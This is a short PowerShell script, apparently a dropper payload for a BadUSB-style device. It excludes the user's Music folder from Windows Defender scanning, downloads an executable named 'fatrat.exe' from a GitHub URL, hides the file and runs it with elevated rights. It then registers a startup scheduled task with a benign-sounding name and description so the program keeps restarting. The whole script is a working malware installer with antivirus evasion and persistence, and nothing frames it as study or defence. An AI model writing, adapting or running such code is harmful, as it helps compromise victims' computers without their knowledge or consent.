Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

$url = "https://github.com/armanina444/deadly-spark-attiny85/raw/refs/heads/main/fatrat.exe"
$dest = "$env:USERPROFILE\Music\fatrat.exe"

Invoke-WebRequest -Uri $url -OutFile $dest

Set-ItemProperty -Path $dest -Name Attributes -Value Hidden

Start-Process -FilePath $dest -Verb RunAs   




$exePath = Join-Path $env:USERPROFILE "Music\fatrat.exe"

$action = New-ScheduledTaskAction -Execute $exePath
$trigger = New-ScheduledTaskTrigger -AtStartup

$settings = New-ScheduledTaskSettingsSet `
    -RestartCount 9999 `
    -RestartInterval (New-TimeSpan -Seconds 10) `
    -AllowStartOnBatteries `
    -ExecutionTimeLimit (New-TimeSpan -Hours 24)

Register-ScheduledTask `
    -TaskName "CriticalProgramAutoRestart" `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -Description "Keeps my essential program always running"













    
